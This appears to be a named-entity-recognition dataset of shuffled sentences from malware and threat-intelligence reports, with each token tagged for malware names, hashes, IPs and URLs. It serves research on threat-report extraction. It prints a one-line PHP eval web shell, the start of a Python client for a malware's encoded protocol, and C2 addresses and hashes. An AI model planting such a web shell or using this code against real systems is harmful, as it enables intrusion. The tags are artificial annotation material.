These	O
pipes	O
represent	O
the	O
server	O
side	O
for	O
child	O
instances	O
,	O
and	O
also	O
the	O
point	O
to	O
connect	O
to	O
for	O
hooks	O
Babar	B-malware.drop
installs	O
to	O
spy	O
on	O
several	O
system	O
APIs	O
.	O

Meaning	O

If	O
the	O
network	O
input	O
does	O
not	O
arrive	O
,	O
the	O
queries	O
each	O
of	O
the	O
command	O
handlers	O
for	O
any	O
packets	O
they	O
may	O
have	O
queued	O
(	O
by	O
calling	O
each	O
command	O
handler	O
's	O
ReadWaitingData	O
function	O
)	O
and	O
transmits	O
the	O
packets	O
the	O
handlers	O
have	O
generated	O
.	O

Doherty	O
,	O
and	O
E	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
response	O
given	O
to	O
the	O
malware	O
.	O

facebook	O

However	O
,	O
by	O
all	O
appearances	O
,	O
the	O
attackers	O
noticed	O
the	O
unwanted	O
addition	O
to	O
their	O
malware	O
and	O
got	O
rid	O
of	O
the	O
infection	O
.	O

How	O
is	O
this	O
different	O
from	O
any	O
other	O
targeted	O
attack	O
?	O

getNameList	O

They	O
are	O
sometimes	O
portrayed	O
as	O
wild	O
and	O
reckless	O
,	O
but	O
as	O
seen	O
under	O
our	O
visibility	O
,	O
the	O
group	O
can	O
be	O
pragmatic	O
,	O
measured	O
,	O
and	O
agile	O
.	O

In	O
the	O
case	O
of	O
this	O
post	O
,	O
it	O
appears	O
that	O
at	O
least	O
two	O
different	O
attackers	O
were	O
involved	O
in	O
compromising	O
and	O
placing	O
malicious	O
code	O
on	O
Pro-Democratic	O
websites	O
in	O
Hong	O
Kong	O
.	O

1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42	B-hash

Figure	O
13	O
Content	O
of	O
the	O
data	O
package	O

Among	O
the	O
most-downloaded	O
malicious	O
fi	O
les	O
,	O
we	O
found	O
variants	O
of	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
used	O
in	O
Iron	O
Tiger	O
APT	O
operation	O
.	O

Figure	O
24	O
.	O

We	O
decided	O
to	O
have	O
an	O
even	O
closer	O
look	O
at	O
Agent.BTZ	B-malware.backdoor
and	O
ComRAT	B-malware.backdoor
and	O
therefore	O
analyzed	O
the	O
evolution	O
of	O
this	O
RAT	B-malware.backdoor
,	O
covering	O
seven	O
years	O
of	O
development	O
.	O

Internal	O
Filename	O
:	O
libcef.dll	O

:	O
+966	O
13	O
341	O
9915	O
,	O
Ext	O
.	O

The	O
COZY	O
BEAR	O
intrusion	O
relied	O
primarily	O
on	O
the	O
SeaDaddy	B-malware.backdoor
implant	O
developed	O
in	O
Python	O
and	O
compiled	O
with	O
py2exe	O
and	O
another	O
Powershell	O
backdoor	O
with	O
persistence	O
accomplished	O
via	O
Windows	O
Management	O
Instrumentation	O
(	O
WMI	O
)	O
system	O
,	O
which	O
allowed	O
the	O
adversary	O
to	O
launch	O
malicious	O
code	O
automatically	O
after	O
a	O
specified	O
period	O
of	O
system	O
uptime	O
or	O
on	O
a	O
specific	O
schedule	O
.	O

Siilarly	O
,	O
the	O
IP	O
address	O
(	O
68.96.31.136	B-ip.unknown
)	O
was	O
another	O
C2	O
node	O
reported	O
by	O
Dell	O
SecureWorks	O
as	O
hosting	O
the	O
HTran	O
proxy	O
infrastructure	O
.	O

Some	O
of	O
these	O
are	O
probably	O
also	O
related	O
to	O
this	O
case	O
,	O
but	O
as	O
we	O
have	O
no	O
evidence	O
linking	O
the	O
cases	O
,	O
these	O
malwares	O
have	O
not	O
been	O
included	O
in	O
this	O
paper	O
.	O

The	O
amount	O
of	O
Convertible	O
Currency	O
is	O
then	O
manipulated	O
in	O
the	O
message	O
by	O
changing	O
it	O
to	O
the	O
arbitrary	O
value	O
(	O

Operator	O
Routed	O
to	O
Country	O

Win32/TrojanDropper	O
.	O

Later	O
v4	O
SPLM	B-malware.backdoor
injected	O
individual	O
keylogger	O
,	O
filestealer	O
,	O
and	O
remoteshell	O
modules	O
into	O
memory	O
space	O
.	O

Compiled	O
Time	O
Stamp	O
:	O
2018-01-29	O
09:36:41	O
(	O
Jan	O
.	O

The	O
malware	O
enumerates	O
all	O
processes	O
,	O
and	O
if	O
a	O
process	O
has	O
the	O
module	O
liboradb.dll	O
loaded	O
in	O
it	O
,	O
it	O
will	O
patch	O
2	O
bytes	O
in	O
its	O
memory	O
at	O
a	O
specific	O
offset	O
.	O

According	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
during	O
the	O
2009	O
Green	O
Revolution	O
,	O
Gerdab.ir	B-url.unknown
emerged	O
as	O
the	O
IRGC	O
's	O
domestic	O
hacking	O
group	O
tasked	O
with	O
targeting	O
opposition	O
news	O
websites	O
and	O
individuals	O
considered	O
immoral	O
by	O
the	O
regime	O
.	O

The	O
function	O
'	O
ZwQuerySystemInformation	O
'	O
is	O
also	O
hooked	O
by	O
the	O
malware	O
,	O
a	O
technique	O
frequently	O
used	O
to	O
allow	O
process	O
hiding	O
:	O

The	O
command	O
processing	O
function	O
starts	O
by	O
substituting	O
the	O
main	O
module	O
name	O
and	O
path	O
in	O
the	O
hosting	O
process	O
PEB	O
,	O
with	O
the	O
one	O
of	O
the	O
default	O
internet	O
browser	O
.	O

(	O
2013	O
)	O
.	O

The	O
following	O
is	O
a	O
preliminary	O
Python	O
script	O
that	O
implements	O
the	O
protocol	O
used	O
by	O
the	O
malware	O
and	O
allows	O
you	O
to	O
interact	O
with	O
it	O
:	O
9.	O
import	O
sys	O
10.	O
import	O
socket	O
11.	O
import	O
select	O
14.def	O
decode	O
(	O
x	O
)	O
:	O
15.	O
return	O
'	O
'	O
.join	O
(	O
[	O
chr	O
(	O
(	O
ord	O
(	O
i	O
)	O
*0xd9	O
)	O
&	O
0xff	O
)	O
for	O
i	O
in	O
x	O
]	O
)	O
18.def	O
encode	O
(	O
x	O
)	O
:	O
19.	O
return	O
'	O
'	O
.join	O
(	O
[	O
chr	O
(	O
(	O
ord	O
(	O
i	O
)	O
*0x93	O
)	O
&	O
0xff	O
)	O
for	O
i	O
in	O
x	O
]	O
)	O
22.def	O
main	O
(	O
)	O
:	O
23.	O
s	O
=	O
socket.socket	O
(	O
socket.AF_INET	O
,	O
socket.SOCK_STREAM	O
)	O
24	O
.	O

This	O
JavaScript	O
file	O
is	O
called	O
from	O
other	O
parts	O
of	O
the	O
website	O
and	O
effectively	O
nests	O
the	O
loading	O
of	O
additional	O
JavaScript	O
written	O
and	O
interpeted	O
as	O
:	O

We	O
describe	O
them	O
below	O
.	O

Attacks	O
often	O
play	O
on	O
curiosity	O
or	O
ideology	O
to	O
encourage	O
users	O
to	O
enter	O
passwords	O
or	O
click	O
on	O
enticing	O
files	O
,	O
or	O
exploit	O
fears	O
of	O
hacking	O
and	O
surveillance	O
with	O
fake	O
security	O
tools	O
.	O

It	O
instantiates	O
several	O
suspended	O
browser	O
processes	O
and	O
then	O
replaces	O
the	O
loaded	O
executable	O
memory	O
with	O
the	O
code	O
contained	O
in	O
the	O
embedded	O
resource	O
previously	O
mentioned	O
.	O

This	O
captured	O
packet	O
shows	O
sample	O
backdoor	O
commands	B-malware.backdoor
and	O
replies	O
:	O

During	O
our	O
analysis	O
,	O
we	O
collected	O
a	O
copy	O
of	O
the	O
RATANKBA	B-malware.backdoor
malware	O
's	O
Lazarus	O
Remote	O
Controller	O
tool	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
URL	O
extracted	O
from	O
the	O
C2	O
response	O
.	O

The	O
main	O
module	O
downloads	O
the	O
various	O
data-stealing	O
plugins	O
assigned	O
to	O
each	O
victim	O
,	O
and	O
executes	O
them	O
.	O

Although	O
Trend	O
Micro	O
uses	O
reasonable	O
efforts	O
to	O
include	O
accurate	O
and	O
up-to-date	O
information	O
herein	O
,	O
Trend	O
Micro	O
makes	O
no	O
warranties	O
or	O
representations	O
of	O
any	O
kind	O
as	O
to	O
its	O
accuracy	O
,	O
currency	O
,	O
or	O
completeness	O
.	O

Menu	O

The	O
phishing	O
emails	O
try	O
to	O
trick	O
the	O
users	O
into	O
thinking	O
the	O
emails	O
are	O
legitimate	O
by	O
attaching	O
the	O
RAT	B-malware.infosteal
with	O
the	O
some	O
of	O
the	O
following	O
names	O
:	O
Payment	B-malware.infosteal
Invoice.jar	I-malware.infosteal
,	O
Payment	B-malware.infosteal
details.jar	I-malware.infosteal
,	O
POR#94586.zip/POR#94586.jar	B-malware.infosteal
,	O
INV#94586.zip/INV#94586.jar	B-malware.infosteal
,	O
Invitation.jar	B-malware.infosteal
,	O
reports-pdf.jar	B-malware.infosteal
,	O
US$25k.jar	B-malware.infosteal
,	O
and	O
DBC_BANK_IMG_23456_156.jar	B-malware.infosteal
,	O
and	O
lremit_Transfer_Error_Page.jar	B-malware.infosteal
.	O

00	O
01	O
00	O
00	O
00	O
ff	O
ff	O
ff	O
ff	O
01	O
00	O
00	O
00	O
00	O
00	O
00	O
................	O
00	O
0c	O
02	O
00	O
00	O
00	O
45	O
53	O
68	O
61	O
64	O
6f	O
77	O
54	O
65	O
63	O
......	O
EShadowTec	O
68	O
20	O
52	O
61	O
74	O
2c	O
20	O
56	O
65	O
72	O
73	O
69	O
6f	O
6e	O
3d	O
31	O
h	O
Rat	O
,	O
Version=1	O
2e	O
30	O
2e	O
30	O
2e	O
30	O
2c	O
20	O
43	O
75	O
6c	O
74	O
75	O
72	O
65	O
3d	O
.0.0.0	O
,	O
Culture=	O
6e	O
65	O
75	O
74	O
72	O
61	O
6c	O
2c	O
20	O
50	O
75	O
62	O
6c	O
69	O
63	O
4b	O
neutral	O
,	O
PublicK	O
65	O
79	O
54	O
6f	O
6b	O
65	O
6e	O
3d	O
6e	O
75	O
6c	O
6c	O
05	O
01	O
00	O
00	O
eyToken=null	O
....	O
00	O
13	O
53	O
68	O
61	O
64	O
6f	O
77	O
54	O
65	O
63	O
68	O
5f	O
52	O
61	O
74	O
..ShadowTech_Rat	B-malware.infosteal
2e	O
44	O
61	O
74	O
61	O
03	O
00	O
00	O
00	O
04	O
64	O
61	O
74	O
61	O
05	O
69	O
.	O

This	O
signals	O
just	O
how	O
long	O
ago	O
the	O
Poseidon	B-malware.infosteal
threat	O
actor	O
was	O
already	O
working	O
on	O
its	O
offensive	O
framework	O
.	O

The	O
unpacked	O
executable	O
takes	O
several	O
command	O
line	O
arguments	O
:	O
:	O
list	O
service	O
names	O
,	O
available	O
for	O
its	O
own	O
registration	O
:	O
open	O
specified	O
event	O
:	O
set	O
specified	O
event	O

16.03.2015	O
:	O
The	O
Andromeda/Gamarue	O
botnet	B-malware.ransom
is	O
on	O
the	O
rise	O
again	O

All	O
rights	O
reserved	O
.	O

This	O
C2	O
domain	O
was	O
associated	O
with	O
two	O
IP	O
addresses	O
.	O

Motivation	O
-	O
Based	O
on	O
the	O
nature	O
of	O
the	O
attack	O
,	O
the	O
proprietary	O
information	O
that	O
the	O
attackers	O
were	O
after	O
and	O
the	O
high-profile	O
personnel	O
who	O
were	O
targeted	O
,	O
Cybereason	O
concluded	O
the	O
main	O
motivation	O
behind	O
the	O
attack	O
was	O
cyber	O
espionage	O
.	O

**patched	O
include.preload.js	O
injects	O
two	O
malicious	O
scripts	O
from	O
the	O
attacker	O
's	O
Pastebin	O
account	O
.	O

Web	O
.	O

Figure	O
1	O
:	O
RTF	O
PCAP	O
The	O
XLSM	O
attachments	O
contained	O
multiple	O
worksheets	O
with	O
content	O
that	O
reflected	O
the	O
attachment	O
name	O
.	O

Detected	O
as	O
W2KM_DLOADR.UHAOEEN	O
240b7d2825183226af634d3801713b0e0f409eb3e1e48e1d36c96d2b03d8836b	O
ENTERPRISE	O
SMALL	O
BUSINESS	O
HOME	O

Hacquebord	O
Feike	O
.	O

Table	O
1	O
lists	O
the	O
current	O
detection	O
and	O
blocking	O
capabilities	O
by	O
product	O
.	O

In	O
addition	O
to	O
the	O
fact	O
that	O
the	O
emails	O
share	O
no	O
attributes	O
,	O
the	O
malicious	O
attachments	O
are	O
also	O
unrelated	O
.	O

Did	O
the	O
attackers	O
use	O
any	O
interesting/advanced	O
technologies	O
?	O

When	O
our	O
government	O
clients	O
come	O
under	O
threat	O
,	O
Arcanum	O
Global	O
's	O
embedded	O
specialists	O
and	O
capabilities	O
support	O
them	O
with	O
a	O
full	O
suite	O
of	O
response	O
options	O
,	O
including	O
(	O
in	O
consonance	O
with	O
applicable	O
laws	O
and	O
regulations	O
)	O
an	O
array	O
of	O
countermeasures	O
as	O
well	O
as	O
both	O
in-kind	O
and	O
asymmetric	O
responses	O
.	O

The	O
second	O
is	O
the	O
full	O
URL	O
–	O

PCC_FILE	O
:	O
:ProcessPacket	O
member	O
function	O
,	O
much	O
like	O
PCC_CMD	O
:	O
:ProcessPacket	O
,	O
is	O
little	O
more	O
than	O
a	O
stub	O
function	O
that	O
passes	O
only	O
a	O
copy	O
of	O
the	O
payload	O
data	O
(	O
pkt	O
)	O
to	O

176.56.238.177	B-ip.unknown
,	O
belonging	O
to	O
AS198203	O
ASN-ROUTELABEL	O
RouteLabel	O
V.O.F.	O
in	O
the	O
Netherlands	O
.	O

To	O
learn	O
more	O
,	O
read	O
our	O
Security	O
101	O
:	O
Business	O
Process	O
Compromise	O
.	O

Most	O
importantly	O
,	O
the	O
attacker	O
forgot	O
to	O
cover	O
his	O
trails	O
,	O
enabling	O
us	O
to	O
learn	O
his	O
identity	O
.	O

April	O
24	O
,	O
2018	O
|	O
by	O
Edson	O
Sierra	O
,	O
Gerardo	O
Iglesias	O

The	O
dll	B-malware.backdoor
that	O
connect	O
to	O
'	O
marina-info.net	B-url.unknown
'	O
may	O
be	O
the	O
last	O
stage-malware	B-malware.backdoor
that	O
is	O
triggered	O
only	O
when	O
particular	O
conditions	O
occur	O
,	O
for	O
example	O
when	O
the	O
malware	O
infects	O
a	O
system	O
with	O
an	O
IP	O
address	O
belonging	O
to	O
specific	O
ranges	O
.	O

Actors	O
with	O
a	O
nexus	O
to	O
Russia	O
regularly	O
monitor	O
social	O
media	O
sites	O
in	O
order	O
to	O
better	O
understand	O
or	O
formulate	O
operations	O
against	O
their	O
targets	O
.	O

The	O
capability	O
to	O
terminate	O
a	O
process	O
.	O

Group	O
a6135a6a6346a460792ce2da285778b1	B-hash
ABRIL	O
CmetaS3	O

We	O
noticed	O
that	O
several	O
security	O
companies	O
and	O
enthusiasts	O
had	O
unwittingly	O
reported	O
on	O
fragments	O
of	O
Poseidon	B-malware.infosteal
's	O
campaigns	O
over	O
the	O
years	O
.	O

Examination	O
of	O
the	O
executable	O
from	O
that	O
blog	O
's	O
demo	O
code	O
shows	O
that	O
the	O
WriteInputPoint	O
function	O
calls	O
with	O
byte	O
indices	O
0x110	O
and	O
0x114	O
set	O
pressure	O
and	O
temperature	O
values	O
,	O
respectively	O
:	O
IRONGATE	B-malware.backdoor
:	O
WriteInputPoint	O
(	O
0x110	O
,	O
0	O
,	O
0x7763	O
)	O
WriteInputPoint	O
(	O
0x114	O
,	O
0	O
,	O
0x7763	O
)	O
Equivalent	O
pseudo	O
code	O
from	O
Biogas.exe	O
:	O
S7ProSim.WriteInputPoint	O
(	O
0x110	O
,	O
0	O
,	O
(	O
short	O
)	O
this.Pressure.Value	O
)	O
S7ProSim.WriteInputPoint	O
(	O
0x114	O
,	O
0	O
,	O
(	O
short	O
)	O
this.Temperature.Value	O
)	O
We	O
have	O
been	O
unable	O
to	O
determine	O
the	O
significance	O
of	O
the	O
hardcoded	O
value	O
0x7763	O
,	O
which	O
is	O
passed	O
in	O
both	O
instances	O
of	O
the	O
write	O
function	O
.	O

REFERENCE	O

This	O
has	O
been	O
an	O
ongoing	O
trend	O
in	O
malware	O
development	O
that	O
we	O
and	O
others	O
have	O
observed	O
several	O
times	O
in	O
past	O
.	O

Furthermore	O
,	O
the	O
CLSID	O
was	O
stored	O
in	O
plain	O
text	O
within	O
the	O
sample	O
.	O

The	O
pop-up	O
does	O
make	O
it	O
appear	O
as	O
if	O
the	O
file	O
is	O
an	O
update	O
to	O
Java	O
.	O

As	O
noted	O
in	O
the	O
JPCERT	O
report	O
,	O
Cylance	O
also	O
found	O
that	O
in	O
most	O
cases	O
of	O
successful	O
infection	O
,	O
one	O
of	O
the	O
earliest	O
modules	O
downloaded	O
onto	O
the	O
system	O
added	O
an	O
additional	O
layer	O
of	O
AES	O
communication	O
to	O
the	O
traffic	O
.	O

With	O
all	O
of	O
this	O
information	O
in	O
mind	O
,	O
we	O
assume	O
with	O
high	O
confidence	O
that	O
the	O
malware	O
author	O
works	O
out	O
of	O
India	O
.	O

The	O
campaign	O
attempted	O
to	O
discredit	O
and	O
demonize	O
the	O
main	O
Iranian	O
opposition	O
party	O
,	O
the	O
People	O
's	O
Mojahedin	O
Organization	O
of	O
Iran/Mojahedin-e	O
Khalq	O
(	O
PMOI/MEK	O
)	O
.	O

We	O
do	O
suspect	O
large	O
portions	O
of	O
the	O
product	O
enumeration	O
to	O
be	O
based	O
on	O
the	O
exact	O
same	O
source	O
code	O
as	O
the	O
module	O
Bunny	B-malware.unknown
used	O
.	O

If	O
any	O
of	O
those	O
names	O
are	O
found	O
and	O
the	O
browser	O
is	O
one	O
of	O
the	O
following	O
,	O
the	O
Trojan	O
will	O
terminate	O
that	O
browser	O
.	O

Getpass.exe	O
52a8557c8cdd5d925453383934cb10a85b117522b95c6d28ca097632ac8bc10d	B-hash
event.dll	O
6c3224dbf6bbabe058b0ab46233c9d35c970aa83e8c4bdffb85d78e31159d489	B-hash
mail.exe	O
2f76c9242d5ad2b1f941fb47c94c80c1ce647df4d2d37ca2351864286b0bb3d8	B-hash

Examination	O
of	O
the	O
file	O
names	O
and	O
the	O
Safeengine	O
executable	O
protector	O
suggest	O
that	O
the	O
malware	O
was	O
made	O
in	O
China	O
.	O

It	O
then	O
adds	O
1000	O
to	O
EBX	O
,	O
yielding	O
887	O
.	O

Given	O
the	O
estimated	O
development	O
timeframe	O
and	O
the	O
promotional	O
period	O
for	O
the	O
benign	O
30.apk	B-malware.backdoor
application	O
,	O
the	O
program	O
was	O
likely	O
available	O
online	O
for	O
distribution	O
after	O
late	O
April	O
2013	O
.	O

When	O
the	O
file	O
is	O
opened	O
,	O
it	O
drops	O
HIGHTIDE	B-malware.backdoor
in	O
the	O
form	O
of	O
an	O
executable	O
file	O
onto	O
the	O
infected	O
system	O
.	O

CVE-2018-8174	B-malware.unknown
is	O
a	O
remote	O
code	O
execution	O
vulnerability	O
of	O
Windows	O
VBScript	O
engine	O
.	O

The	O
BAT	O
fi	O
le	O
is	O
saved	O
in	O
the	O
%	O
TEMP	O
%	O
folder	O
as	O
'	O
win32shell.bat	O
'	O
.	O

Hypothesis	O
2	O
:	O
Tranchulas	O
developed	O
and	O
sold	O
the	O
malicious	O
binaries	O
to	O
an	O
unidentified	O
customer	O
,	O
where	O
they	O
were	O
later	O
operationalized	O
by	O
an	O
unidentified	O
entity	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O

We	O
have	O
provided	O
an	O
updated	O
version	O
of	O
those	O
conclusions	O
,	O
a	O
layout	O
of	O
the	O
tactics	O
that	O
they	O
generally	O
employ	O
,	O
as	O
well	O
as	O
observations	O
of	O
apparent	O
tactical	O
shifts	O
.	O

The	O
attacker	O
can	O
reprogram	O
the	O
SIS	O
logic	O
to	O
cause	O
it	O
to	O
trip	O
and	O
shutdown	O
a	O
process	O
that	O
is	O
,	O
in	O
actuality	O
,	O
in	O
a	O
safe	O
state	O
.	O

These	O
facts	O
significantly	O
challenge	O
the	O
existing	O
'	O
official	O
'	O
history	O
of	O
Stuxnet	B-malware.backdoor
.	O

test.php	O
:	O
<	O
?	O
php	O
@	O
eval	O
(	O
$	O
_POST	O
[	O
'	O
password	O
'	O
]	O
)	O
;	O
?	O

Data	O
:	O
(	O
full	O
path	O
to	O
the	O
backdoor	O
)	O
SYSTEM\CurrentControlSet\Services\	O
RaS	O
?	O
?	O

The	O
thread	O
KeyloggerThread	O
is	O
spawned	O
and	O
is	O
responsible	O
for	O
doing	O
keylogging	O
on	O
the	O
target	O
workstation	O
.	O

This	O
log	O
contained	O
information	O
for	O
the	O
control	O
server	O
thlsystems.for rst.cz	O
,	O
which	O
showed	O
an	O
IP	O
address	O
from	O
South	O
Korea	O
connecting	O
to	O
the	O
speci c	O
URL	O
paths	O
contained	O
in	O
the	O
PowerShell	O
implants	O
.	O

Other	O
versions	O
tried	O
to	O
open	O
the	O
file	O
OUTLFLTR.DAT	O
.	O

These	O
attackers	O
aggressively	O
pursue	O
and	O
compromise	O
chosen	O
targets	O
in	O
order	O
to	O
steal	O
sensitive	O
information	O
.	O

The	O
logged	O
in	O
account	O
,	O
as	O
seen	O
from	O
the	O
journal	O
,	O
is	O
then	O
used	O
to	O
check	O
how	O
much	O
Convertible	O
Currency	O
amount	O
(	O

We	O
have	O
reason	O
to	O
believe	O
CozyDuke	B-malware.drop
is	O
being	O
used	O
to	O
target	O
governmental	O
organizations	O
and	O
entities	O
that	O
work	O
closely	O
with	O
such	O
bodies	O
.	O

This	O
converts	O
the	O
native	O
x86	O
instructions	O
of	O
the	O
malware	O
into	O
another	O
custom	O
language	O
chosen	O
from	O
one	O
of	O
11	O
code	O
templates	O
.	O

Calling	O
on	O
years	O
of	O
collective	O
experience	O
in	O
positions	O
that	O
placed	O
their	O
analysts	O
at	O
the	O
tip	O
of	O
the	O
cyber-spear	O
,	O
root9B	O
has	O
developed	O
a	O
unique	O
approach	O
to	O
the	O
problem	O
of	O
cyber-defense	O
.	O

32	O
.	O

Interestingly	O
the	O
backdoor	O
will	O
also	O
load	O
the	O
legitimate	O
file	O
resolve	O
functions	O
and	O
pass	O
calls	O
to	O
it	O
so	O
it	O
does	O
n't	O
break	O
audio	O
playback	O
on	O
the	O
victim	O
system	O
.	O

It	O
communicates	O
with	O
its	O
C2	O
server	O
through	O
HTTP	O
over	O
nonstandard	O
TCP	O
ports	O
,	O
and	O
will	O
send	O
encoded	O
information	O
containing	O
basic	O
system	O
information	O
back	O
,	O
including	O
hostname	O
,	O
username	O
,	O
and	O
operating	O
system	O
within	O
the	O
content	O
of	O
the	O
POST	O
.	O

The	O
C	O
&	O
C	O
console	O
allowed	O
attackers	O
to	O
live	O
track	O
their	O
victims	O
.	O

Sofacy	O
's	O
choice	O
of	O
targets	O
has	O
historically	O
been	O
an	O
interesting	O
mixture	O
that	O
has	O
fueled	O
an	O
ongoing	O
debate	O
over	O
whether	O
the	O
group	O
is	O
criminal	O
in	O
nature	O
,	O
or	O
actually	O
an	O
agent	O
of	O
a	O
nation-state	O
.	O

During	O
the	O
course	O
of	O
our	O
investigation	O
,	O
JPCERT	O
published	O
this	O
analysis	O
of	O
one	O
of	O
the	O
group	O
's	O
backdoors	O
.	O

The	O
table	O
below	O
lists	O
all	O
of	O
Koadic	B-malware.unknown
's	O
functions	O
:	O
{	O
Variable	O
}	O
.user	O
User-related	O
functions	O
{	O
Variable	O
}	O
.user.isElevated	O
Check	O
Privilege	O
{	O
Variable	O
}	O
.user.OS	O
Get	O
OS	O
Version	O
{	O
Variable	O
}	O
.user.DC	O
Get	O
DCName	O
from	O
Registry	O
{	O
Variable	O
}	O
.user.Arch	O
Get	O
Architecture	O
{	O
Variable	O
}	O
.user.info	O
Get	O
User	O
Information	O
{	O
Variable	O
}	O
.work	O
Main	O
Routine	O
functions	O
{	O
Variable	O
}	O
.work.report	O
Reports	O
to	O
server	O
{	O
Variable	O
}	O
.work.error	O
Returns	O
error	O
{	O
Variable	O
}	O
.work.make_url	O
Alters/Modifies	O
URL	O
(	O
C	O
&	O
C	O
)	O
{	O
Variable	O
}	O
.work.get	O
Get	O
the	O
return	O
of	O
POST	O
Header	O
{	O
Variable	O
}	O
.work.fork	O
Creates	O
rundll32.exe	O
process	O
{	O
Variable	O
}	O
.http	O
HTTP	O
Connection	O
functions	O
{	O
Variable	O
}	O
.http.create	O
Creates	O
initial	O
HTTP	O
objects	O
{	O
Variable	O
}	O
.http.post	O
POST	O
header	O
{	O
Variable	O
}	O
.http.addHeaders	O
Adds	O
HTTP	O
Headers	O
{	O
Variable	O
}	O
.http.get	O
GET	O
Header	O
{	O
Variable	O
}	O
.http.upload	O
Uploads	O
binaries/data	O
{	O
Variable	O
}	O
.http.bin2str	O
String	O
manipulation	O
{	O
Variable	O
}	O
.http.downloadEx	O
Downloads	O
response	O
{	O
Variable	O
}	O
.http.download	O
Additional	O
download	O
function	O
{	O
Variable	O
}	O
.process	O
Process-related	O
functions	O
{	O
Variable	O
}	O
.process.currentPID	O
Get	O
Current	O
Process	O
ID	O
{	O
Variable	O
}	O
.process.list	O
Enumerates	O
Process	O
{	O
Variable	O
}	O
.process.kill	O
Terminates	O
Process	O
{	O
Variable	O
}	O
.registry	O
Registry-related	O
functions	O
{	O
Variable	O
}	O
.registry.HKCR	O
Set	O
HKEY_CLASSES_ROOT	O
{	O
Variable	O
}	O
.registry.HKCU	O
Set	O
HKEY_CURRENT_USER	O
{	O
Variable	O
}	O
.registry.HKLM	O
Set	O
HKEY_LOCAL_MACHINE	O
{	O
Variable	O
}	O
.registry.STRING	O
Set	O
String	O
Value	O
{	O
Variable	O
}	O
.registry.BINARY	O
Set	O
Binary	O
Value	O
{	O
Variable	O
}	O
.registry.DWORD	O
Set	O
DWORD	O
Value	O
{	O
Variable	O
}	O
.registry.QWORD	O
Set	O
QWORD	O
Value	O
{	O
Variable	O
}	O
.registry.write	O
Write/Add	O
Registry	O
{	O
Variable	O
}	O
.registry.provider	O
Create	O
Registry	O
Handle	O
{	O
Variable	O
}	O
.registry.destroy	O
Deletes	O
Registry	O
Key	O
{	O
Variable	O
}	O
.registry.read	O
Get/Read	O
Registry	O
Entries	O
{	O
Variable	O
}	O
.WMI	O
WMI-related	O
functions	O
{	O
Variable	O
}	O
.WMI.createProcess	O
Creates	O
specified	O
process	O
{	O
Variable	O
}	O
.shell	O
File/Process	O
Execution	O
functions	O
{	O
Variable	O
}	O
.shell.run	O
Run	O
commands	O
{	O
Variable	O
}	O
.shell.exec	O
Executes	O
process	O
{	O
Variable	O
}	O
.file	O
File-related	O
functions	O
{	O
Variable	O
}	O
.file.getPath	O
Get	O
specified	O
file	O
path	O
{	O
Variable	O
}	O
.file.readText	O
Reads	O
specified	O
text	O
file	O
{	O
Variable	O
}	O
.file.get32BitFolder	O
Get	O
System	O
Folder	O
(	O
32/64-bit	O
)	O
{	O
Variable	O
}	O
.file.writol	O
Writes	O
on	O
specified	O
file	O
{	O
Variable	O
}	O
.file.deleteFile	O
Deletes	O
specified	O
file	O
{	O
Variable	O
}	O
.file.readBinary	O
Reads	O
specified	O
binary	O
file	O
.	O

It	O
will	O
then	O
ensure	O
that	O
only	O
one	O
instance	O
of	O
the	O
program	O
runs	O
at	O
a	O
given	O
moment	O
by	O
checking	O
for	O
the	O
presence	O
of	O
a	O
particular	O
mutex	O
on	O
the	O
system	O
.	O

We	O
decided	O
to	O
inspect	O
two	O
different	O
datasets	O
:	O
our	O
incoming	O
sample	O
feeds	O
/	O
malware	O
zoo	O
,	O
and	O
the	O
telemetry	O
associated	O
with	O
our	O
Advanced	O
Malware	O
Protection	O
(	O
AMP	O
)	O
solutions	O
.	O

File	O
Name	O
:	O
INV#94586.jar	B-malware.infosteal
File	O
Size	O
:	O
43885	O
bytes	O
MD5	O
:	O
06c2760060d41533b36572ae3c1ba2df	B-hash
SHA1	O
:	O
0350f53a821933e05bf82508b1e458c83d37b7c8	B-hash

Once	O
fully	O
unpacked	O
in	O
memory	O
,	O
it	O
appears	O
to	O
be	O
an	O
x86	O
variant	O
of	O
the	O
fdsvc.dll	B-malware.backdoor
backdoor	O
described	O
in	O
our	O
February	O
blogpost	O
'	O
Lazarus	B-malware.unknown
'	I-malware.unknown
False	I-malware.unknown
Flag	I-malware.unknown
Malware	I-malware.unknown
'	O
.	O

Just	O
kidding	O
.	O

2009	O
14.07	O
.	O

Parser	O
:	O
:inByte	O
method	O
When	O
scrambling	O
one	O
byte	O
,	O
the	O
scrambler	O
first	O
determines	O
if	O
the	O
byte	O
value	O
is	O
odd	O
or	O
even	O
.	O

After	O
the	O
file	O
is	O
saved	O
,	O
the	O
code	O
deletes	O
the	O
temporary	O
table	O
.	O

Record	O
#	O
0	O
Length	O
:	O
243	O
bytes	O
:	O

The	O
malware	O
attempts	O
to	O
locate	O
the	O
configuration	O
and	O
password	O
store	O
files	O
for	O
a	O
variety	O
browsers	O
and	O
chat	O
clients	O
as	O
seen	O
below	O
:	O
We	O
observed	O
the	O
creation	O
of	O
the	O
file	O
'	O
t111o00000000.dat	O
'	O
in	O
the	O
data	O
harvesting	O
directory	O
,	O
as	O
shown	O
in	O
the	O
filesystem	O
timeline	O
below	O
:	O

Thanks	O
to	O
the	O
logs	O
located	O
on	O
the	O
MDM	B-malware.infosteal
servers	O
and	O
the	O
malware	O
's	O
command	O
and	O
control	O
(	O
C2	O
)	O
server	O
,	O
we	O
were	O
able	O
to	O
determine	O
that	O
the	O
malware	O
has	O
been	O
in	O
use	O
since	O
August	O
2015	O
.	O

Other	O
resources	O
include	O
:	O

In	O
July	O
2015	O
security	O
company	O
Cyphort	O
reported	O
the	O
compromise	O
of	O
a	O
news	O
portal	O
and	O
a	O
banking	O
site	O
–	O
rbc.ua	O
and	O
unicredit.ua	O
.	O

In	O
the	O
below	O
screen	O
shot	O
the	O
URL	O
(	O
hxxp://c2xyup.com/update.exe	B-url.unknown
)	O
is	O
not	O
the	O
actual	O
URL	O
used	O
by	O
the	O
malware	O
for	O
updating	O
,	O
this	O
is	O
a	O
test	O
URL	O
used	O
to	O
determine	O
the	O
functionality	O
,	O
so	O
this	O
URL	O
should	O
not	O
used	O
as	O
an	O
indicator	O
.	O

The	O
fact	O
that	O
the	O
